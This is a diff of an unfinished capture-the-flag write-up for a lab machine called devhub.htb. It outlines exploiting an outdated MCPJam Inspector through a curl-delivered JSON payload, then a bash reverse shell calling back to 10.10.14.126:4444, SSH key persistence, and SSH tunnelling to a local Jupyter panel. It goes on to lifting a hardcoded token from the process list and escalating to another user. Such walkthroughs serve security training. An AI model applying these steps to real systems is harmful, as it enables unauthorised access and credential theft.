@@ -6,7 +6,7 @@
  	- `nmap` scan of `10.129.18.105` indentified open ports: 22, 88, 6274
   
 # Web reconnaissance
-- Vulnerability Analysis: Identifying an outdated version of MCPJam Inspector v1.4.2 on `http://devhub:6274.htb`
+- Vulnerability Analysis: Identifying an outdated version of MCPJam Inspector v1.4.2 on `http://devhub.htb:6274`
 - CVE-2026-23744: Exploiting a critical vulnerability in the MCP API to achieve Remote Code Execution (RCE).
 - Payload Delivery: Utilizing curl to inject a malicious JSON configuration into the /api/mcp/connect endpoint.
 
@@ -22,9 +22,25 @@
   		"serverId":"rev_shell"
   	}'
 			
-Establishing a callback to `10.10.14.126:4444` via bash interactive shell.
-
+- Establishing a callback to `10.10.14.126:4444` via bash interactive shell.
+- Gaining access to `mcp-dev` user with `uid:1001` 
+  
 ## Persistence and Stabilization
 - SSH Key Injection: Generating and hosting a public RSA key via a local HTTP server.
 - Credential Placement: Deploying the public key into the target user’s `.ssh/authorized_keys` directory.
 - Stable Connection: Establishing a persistent SSH session to replace the volatile reverse shell.
+
+## Lateral movement and system enumeration
+- File enumeration: `cat /etc/passwd` revealed other user: `analyst` with `uid:1002`
+- Socket scan: `ss -tulpn` - open port `8888` on `127.0.0.1`, same port was shown on `http://devhub.htb`
+- SSH tunneling: `ssh -i mcp-dev@devhub.htb -L 4444:127.0.0.1:8888` leading to full `localhost:8888` access from attacker's pc
+- Local panel enumeration: `localhost:8888` led to jupyter panel, which became next attack vector
+- Process scan: `ps aux | grep jupyter` shown process with hardcoded `--ServerApp.token`, leading to token compromise
+
+## Priviledge escalation
+- Token usage: Extracted token was used to gain controll over jupyter panel, leading to `analyst` compromise
+- Credential Placement: Deploying the public key into the target user’s `.ssh/authorized_keys` directory via `wget` and previously prepared `http` server.
+- Stable Connection: Establishing a persistent key-based SSH connection
+- `/home/analyst/user.txt` extraction
+
+  *work in progress*
